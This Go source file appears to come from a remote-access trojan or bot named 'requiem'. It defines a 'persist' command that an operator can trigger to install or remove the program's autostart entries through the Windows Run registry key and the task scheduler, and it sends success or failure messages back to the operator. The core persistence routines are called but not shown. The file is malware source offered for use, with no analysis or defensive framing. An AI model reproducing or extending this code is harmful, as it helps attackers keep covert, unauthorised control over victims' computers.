package commands

import (
	"strings"

	"requiem/persistence"
	"requiem/store"
	"requiem/utils"
)

func (*PersistCommand) Exec(ctx *store.CommandContext, args []string) {
	content := strings.Join(args, " ")
	if utils.HasFlag(content, "unpersist") {
		err := persistence.RunRegistryUnpersist()
		if err != nil {
			ctx.ReplyMsg("🟥 Failed to unpersist (run registry).")
		}

		err = persistence.SchedularUnpersist()
		if err != nil {
			ctx.ReplyMsg("🟥 Failed to unpersist (schedular).")
			return
		}

		ctx.ReplyMsg("🟩 Successfully unpersisted.")
		return
	}

	err := persistence.RunRegistryPersist("", true)
	if err != nil {
		ctx.ReplyMsg("🟥 Failed to persist (run registry).")
	}

	err = persistence.SchedularPersist("", true)
	if err != nil {
		ctx.ReplyMsg("🟥 Failed to persist (schedular).")
		return
	}

	ctx.ReplyMsg("🟩 Successfully persisted.")
}

func (*PersistCommand) Name() string {
	return "persist"
}

func (*PersistCommand) Info() string {
	return "Persists or re-persists this if it was disabled."
}

type PersistCommand struct{}
